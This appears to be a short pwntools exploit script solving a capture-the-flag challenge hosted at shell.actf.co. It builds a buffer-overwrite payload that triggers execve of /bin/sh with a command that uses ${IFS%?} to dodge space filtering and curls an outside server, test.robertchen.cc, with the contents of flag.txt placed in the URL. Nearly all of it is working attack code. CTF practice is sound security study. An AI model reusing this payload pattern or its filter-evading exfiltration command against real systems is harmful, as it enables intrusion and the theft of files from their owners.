from pwn import *

#p = process("./server")
p = remote("shell.actf.co", 19303)
#p = remote("localhost", 19303)

rax = 59 #sys_execve
rdi = "/bin/sh\x00"

command = "curl${IFS%?}test.robertchen.cc:8080/`cat${IFS%?}flag.txt`\x00"

exploit = "A" * (0x402810 - 0x402010 + 4 - 16 - len(command))
exploit += command
exploit += "-c" + "\x00" * 6
exploit += rdi # 0x402808

exploit += p64(0x402808) + p64(-65, sign=True)
exploit += p64(0x402808) + p64(0x402800) + p64(0x402800 - len(command)) 
exploit += "\x00"*(0x40289e-0x402828 - len(command)) + "A "

p.sendline(exploit)

p.interactive()
